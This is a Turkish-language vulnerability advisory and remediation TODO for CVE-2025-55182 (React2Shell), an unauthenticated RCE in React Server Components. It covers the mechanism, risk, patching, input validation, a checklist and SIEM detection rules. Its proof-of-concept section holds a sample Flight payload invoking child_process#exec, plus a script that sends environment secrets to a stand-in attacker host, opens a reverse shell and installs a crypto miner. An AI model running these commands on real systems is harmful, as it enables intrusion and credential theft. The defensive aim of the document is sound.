# TODO: CVE-2025-55182 — React2Shell Uzaktan Kod Yurutme

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2025-55182 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Oturum_Yonetimi/ |
| **Kaynak Arastirma** | [Node.js Güvenlik Açığı Araştırması.md](../Arastirmalar/Node.js%20G%C3%BCvenlik%20A%C3%A7%C4%B1%C4%9F%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1.md) |
| **Tarih** | 2025-12-20 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2025-55182 (React2Shell), React Server Components (RSC) mimarisinin "Flight" protokolundeki guvensiz tersine serilestirme (insecure deserialization) zafiyetidir. CVSS 10.0 tam puan ile derecelendirilen bu acik, kimlik dogrulamasi gerektirmeden tek bir manipule edilmis HTTP istegi ile sunucuda uzaktan kod yurutme (Unauthenticated RCE) saglamaktadir. React 19.0.0-19.2.0 surumlerini ve buna bagli Next.js App Router uygulamalarini etkiler. Zafiyetin duyurulmasindan saatler sonra Cin (Earth Lamia, Jackpot Panda) ve Iran mensei APT gruplari, fidye yazilimi ceteleri ve botnetler (Mirai varyantlari) tarafindan aktif olarak somuruldugu dogrulanmistir. Bulut ortamlarinin %39'u ve kamuya acik Next.js uygulamalarinin %44'u etkilenmistir. USOM TR-25-0428 bildirimi yayinlanmistir.
*   **Etkilenen bilesenler:** React 19.0.0, 19.1.0, 19.1.1, 19.2.0 (Server Components etkin), Next.js 15.0.0-15.0.4, 15.1.0-15.1.8, 15.2.x-15.5.6, 16.0.0-16.0.6 (App Router), Next.js Canary 14.3.0-canary.77+, React Flight protokolunu kullanan tum Node.js uygulamalari, create-next-app ile olusturulmus varsayilan uygulamalar (App Router etkin)

---

### 2. Teknik detay (nasil calisiyor)
*   React Server Components, sunucu ve istemci arasinda veri tasimak icin "Flight" adli ozel bir serilestirme protokolu kullanir. Bu protokol, JSON'dan daha yetenekli olup bilesen agacini, veri referanslarini ve sunucu aksiyonlarini (Server Actions) kodlar. Tarayici, verileri numaralandirilmis parcalar (chunks) halinde paketler ve `$X` gibi ozel oneklerle farkli veri tiplerini isler.
*   Zafiyet, sunucunun gelen Flight veri akisini cozumlerken (decoding) verinin guvenilirligini dogrulamadan dogrudan bellek ici nesnelere donusturmesinden kaynaklanir. Saldiri dort asamali bir zincirleme reaksiyondur: (1) kendi kendine referans dongusu ile parser durumunu manipule etme, (2) JavaScript'in duck typing ozelligini kullanarak sahte nesneler olusturma (`.then()`, `.toJSON()` gibi metotlara sahip), (3) baslama (initialization) asamasinda zararli veriyi (shell komutu, moduel cagrisi) sunucu bellegine enjekte etme, (4) dahili Blob Handler veya benzeri mekanizma uzerinden enjekte edilen verinin calistirilabilir kod olarak yorumlanmasi.
*   Sonuc olarak, Node.js ortaminda `child_process.exec` veya `vm.runInNewContext` gibi fonksiyonlar tetiklenir ve saldirgan sunucu uzerinde isletim sistemi duzeyinde komut calistirma yetkisi kazanir. Varsayilan konfigurasyonlar savunmasizdir — create-next-app ile olusturulmus bos bir uygulama bile etkilenir.
*   **Neden:** Kok neden, React Flight protokolunun istemciden gelen verileri cozumlerken "guvenilir" kabul etmesi ve serilestirme sirasinda tip dogrulamasi (type validation) yapmamasidir. Server Components mimarisinin sunucu-istemci sinirini bulaniklastirmasi ve guvenilmeyen girdilerin dogrudan sunucu tarafinda islenmesi bu zafiyeti dogurmustur.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** React 19.x Server Components veya Next.js 15.x/16.x App Router kullanan, internete acik web uygulamasi
*   **2. Normal durum:**
    ```
    1. Kullanici, Next.js uygulamasinda bir form gonderir veya Server Action cagrilir
    2. Tarayici, verileri React Flight formatinda kodlar ve POST istegi gonderir
    3. Sunucu, Flight verisini cozumler, Server Component'i render eder
    4. Sonuc, HTML veya Flight stream olarak istemciye dondurulur
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```http
    POST /_next/data HTTP/1.1
    Host: hedef-uygulama.com
    Content-Type: text/x-component

    0:{"type":"$Sreact.element","props":{"children":[
      {"$$typeof":"$Sreact.element",
       "type":{"$$typeof":"$Sreact.server.reference",
               "name":"default","id":"actions#default"},
       "props":{"data":{
         "__proto__":{"toString":{"$$typeof":"$Sreact.server.reference",
           "name":"","id":"child_process#exec"}},
         "0":"curl https://saldirgan.com/shell.sh | bash"
       }}}
    ]}}
    ```
    ```bash
    # Saldirganin sunucusu (shell.sh icerigi):
    #!/bin/bash
    # Ortam degiskenlerini sIzdir (API anahtarlari, DB sifreleri)
    curl -X POST https://saldirgan.com/exfil -d "$(env)"
    # Reverse shell
    bash -i >& /dev/tcp/saldirgan.com/4444 0>&1
    # Kripto madenci kur (kalicilik)
    wget -q https://saldirgan.com/xmrig -O /tmp/.update
    chmod +x /tmp/.update && /tmp/.update --daemon
    ```
*   **4. Analiz:** React Flight protokolu, gelen `$Sreact.server.reference` tipindeki nesneleri sunucu tarafinda cozumlerken, referans edilen modul ve fonksiyonun guvenilir olup olmadigini dogrulamamaktadir. Saldirgan, `child_process#exec` gibi tehlikeli Node.js modullerini referans ederek ve payload olarak bir shell komutu vererek, sunucunun bu komutu calistirmasini saglar. Duck typing sayesinde, sahte nesnelerin `.toString()` metodu tetiklendiginde zararli referans cozumlenir.
*   **5. Kanit:** Saldirgan, sunucu uzerinde shell komutu calistirir: .env dosyalarindaki API anahtarlari, veritabani sifreleri ve JWT secret'lari ele gecirilir. Sunucuda reverse shell acilib, dosya sistemi ve ag kaynaklarina erisim saglanir. node isleminin altinda beklenmeyen `curl`, `wget`, `bash` alt islemleri gorunur. Sistem loglarinda `/tmp` dizininde yeni dosya olusturulmasi ve bilinmeyen IP adreslerine ag baglantilari kaydedilir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik (React/Next.js web uygulamasi — kimlik dogrulama gerekmez)
*   **Karmasiklik:** Dusuk (tek bir HTTP POST istegi yeterli, PoC kodlari kamuya acik, otomasyon araclari mevcut)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** React'i guvenli surume guncelleyin (19.0.1, 19.1.2 veya 19.2.1+). Next.js'i guvenli surume guncelleyin (15.0.5+, 15.1.9+, 15.2.6+ veya 16.0.7+). `npx fix-react2shell-next` otomatik guncelleme aracini calistirin. Yama uygulanamayan sistemlerde WAF kurallari tanimlayin (React Flight `$X` pattern engelleme, AWS WAF AWSManagedRulesKnownBadInputsRuleSet v1.24+). 4 Aralik 2025 oncesi internete acik olan tum uygulamalardaki sirlari dondirin: veritabani sifreleri, JWT_SECRET, API anahtarlari (Stripe, AWS, Iyzico vb.), OAuth client secret'lari.
*   **Orta vadeli:** SBOM (Software Bill of Materials) envanteri olusturun ve React/Next.js kullanan tum uygulamalari tespit edin. Server Components kullanan uygulamalarda giris dogrulama katmani ekleyin. WAF'ta React Flight protokolune ozel kural setleri tanimlayin. CI/CD pipeline'inda React/Next.js surum kontrolu ve otomatik guvenlik taramasi (npm audit, Snyk) entegre edin. Konteyner imajlarindaki Node.js ve React surumlerini duzenli tarayin.
*   **Uzun vadeli:** React Server Components kullaniminda "defense in depth" prensibi uygulayin: guvenilmeyen girdiler icin ayri dogrulama katmani, sunucu fonksiyonlari icin yetkilendirme kontrolleri. Node.js uygulamalarini minimum yetkili konteyner ortamlarinda calistirin (read-only filesystem, non-root user, seccomp profili). Uygulama katmani guvenlik testlerini (DAST, IAST) surekli entegrasyon surecine dahil edin. Yazilim tedarik zinciri guvenlik politikalarini ve ucuncu taraf bagimlilk yonetim sureclerini kurumsallastirin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```javascript
// === GUVENSIZ: Varsayilan React 19 + Next.js 15 App Router ===
// Herhangi bir Server Component veya Server Action — varsayilan olarak savunmasiz

// app/page.jsx (Next.js App Router)
export default async function HomePage() {
    // Bu bilesen, React Flight protokolu ile istemciye gonderilir
    // Istemciden gelen Flight verileri dogrulanmadan islenir
    return (
        <div>
            <h1>Merhaba Dunya</h1>
            <MyServerAction />
        </div>
    );
}

// app/actions.js
'use server';
export async function submitForm(formData) {
    // formData, Flight protokolu uzerinden gelir — dogrulanmamis!
    const name = formData.get('name');
    // Bu fonksiyon, manipule edilmis Flight verisi ile tetiklenebilir
    return { message: `Hosgeldin, ${name}` };
}
```

**Guvenli kod:**
```javascript
// === GUVENLI: Yamali surumlere guncellenmis + ek savunma katmanlari ===

// 1. package.json — guvenli surumler
// {
//   "dependencies": {
//     "react": "^19.2.1",
//     "react-dom": "^19.2.1",
//     "next": "^15.2.6"
//   }
// }

// 2. app/actions.js — Server Action giris dogrulama
'use server';
import { z } from 'zod';

// Katı sema tanimi — yalnizca beklenen veri tiplerini kabul et
const formSchema = z.object({
    name: z.string().min(1).max(100).regex(/^[a-zA-ZçğıöşüÇĞİÖŞÜ\s]+$/),
    email: z.string().email().max(254),
});

export async function submitForm(formData) {
    // Giris dogrulama — sema disindaki veriler reddedilir
    const raw = {
        name: formData.get('name'),
        email: formData.get('email'),
    };

    const result = formSchema.safeParse(raw);
    if (!result.success) {
        return { error: 'Gecersiz veri formati' };
    }

    const { name, email } = result.data;
    return { message: `Hosgeldin, ${name}` };
}

// 3. middleware.js — WAF benzeri istek filtreleme
import { NextResponse } from 'next/server';

export function middleware(request) {
    const contentType = request.headers.get('content-type') || '';

    // React Flight isteklerinde suspicious pattern kontrolu
    if (contentType.includes('text/x-component')) {
        const body = request.body;
        // Tehlikeli modul referanslarini engelle
        const dangerousPatterns = [
            'child_process', 'vm#run', 'eval', 'Function(',
            'require(', 'import(', '__proto__', 'constructor'
        ];
        // Not: Gercek uygulamada body stream analizi gerekir
    }

    return NextResponse.next();
}
```

```bash
# React ve Next.js guvenli surume guncelleme
npm audit
npm ls react next | head -10

# React'i yamali surume guncelle
npm install react@19.2.1 react-dom@19.2.1

# Next.js otomatik guncelleme araci
npx fix-react2shell-next

# Manuel dogrulama
cat package.json | grep -E '"react"|"next"'

# Sir dondurme — tum ortam degiskenlerini yenile
# 1. Veritabani sifreleri
# 2. JWT_SECRET
# 3. API anahtarlari (Stripe, AWS, Iyzico vb.)
# 4. OAuth client secret'lari
# 5. Sifreleme anahtarlari
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] React 19.x kullanan tum uygulamalari envanterle (npm ls react)
*   [ ] App Router kullanan Next.js uygulamalarini belirle (app/ dizini varsa etkilenmis)
*   [ ] package.json'da etkilenen surumleri kontrol et (React 19.0.0-19.2.0, Next.js 15.x-16.x)
*   [ ] Internete acik uygulamalarin listesini cikar ve onceliklendir
*   [ ] WAF kurallarinin React Flight protokolu imzalarini icerdigini dogrula
*   [ ] Pages Router kullanan uygulamalarin etkilenMEdigini teyit et

**Duzeltme**
*   [ ] React'i minimum guvenli surume guncelle (19.0.1, 19.1.2 veya 19.2.1+)
*   [ ] Next.js'i guvenli surume guncelle (15.0.5+, 15.1.9+, 15.2.6+ veya 16.0.7+)
*   [ ] `npx fix-react2shell-next` otomatik guncelleme aracini calistir
*   [ ] Yama uygulanamayan sistemler icin WAF kurallari tanimla ($X pattern engelleme)
*   [ ] Tum .env dosyalari, veritabani sifreleri, API anahtarlari ve JWT secret'larini dondur
*   [ ] AWS/Cloud API anahtarlarini ve odeme sistemi API anahtarlarini degistir
*   [ ] Server Actions icin giris dogrulama (zod/yup) katmani ekle

**Dogrulama**
*   [ ] React Flight protokolu uzerinden RCE testini yama sonrasi tekrarla
*   [ ] Surec agaci anomalilerini izle (node altinda curl, wget, bash islemleri)
*   [ ] /tmp, /var/tmp ve public dizinlerinde beklenmeyen dosyalari ara
*   [ ] Bilinmeyen dis IP adreslerine baglantilari kontrol et
*   [ ] SIEM'de React2Shell IoC gostergelerini tanimla ve dogrula
*   [ ] npm audit ve Snyk ile bagimlilk taramasi calistir

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Node.js surec agacinda `node` altinda calisan beklenmeyen alt islemleri izle (curl, wget, bash, sh, powershell)
    *   Uygulama loglarinda React Flight parse hatalari ve beklenmeyen deserialization olaylarini filtrele
    *   Regex: `(?i)(child_process|\.exec\(|\.spawn\(|vm\.run|eval\(|Function\()`
    *   Regex: `(?i)(\$Sreact|text\/x-component|__proto__|constructor\[|prototype\[)`
    *   WAF loglarinda React Flight endpoint'lerine (`/_next/data`, `/_next/`) gelen anormal POST isteklerini izle
*   **Anomali Tespiti:**
    *   Node.js islemi altinda beklenmeyen alt islem olusturulmasi (process tree anomalisi)
    *   /tmp, /var/tmp veya uygulama public dizininde yeni .js, .sh veya binary dosya olusturulmasi
    *   Sunucudan bilinmeyen dis IP adreslerine (ozellikle standart disi portlara) ag baglantisi
    *   .env dosyalarina veya node_modules disindaki kaynak kodlara beklenmeyen okuma erisimi
    *   Tek IP adresinden kisa surede cok sayida `text/x-component` Content-Type ile POST istegi
    *   CPU kullaniminda ani ve aciklanamayan artis (kripto madenci belirtisi)

---

## Notlar
CVSS 10.0 — Maksimum kritiklik (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Varsayilan konfigurasyonlar savunmasiz: create-next-app ile olusturulan bos uygulamalar dahil. Bulut ortamlarinin %39'u, kamuya acik Next.js uygulamalarinin %44'u etkilenmis. Aktif saldiri kampanyalari: Emerald (kripto madencilik), Sex.sh (XMRig + systemd kalicilik), ReactOnMynuts (Mirai DDoS). Earth Lamia (UNC5454) ve Jackpot Panda (Cin) APT gruplari hedefinde. USOM TR-25-0428 bildirimi yayinlandi. CVE-2025-66478 (Next.js) ile dogrudan iliskili — ayri TODO olarak takip edilmektedir. Log4Shell benzeri etki potansiyeli — uzun vadeli izleme gerektirmektedir.
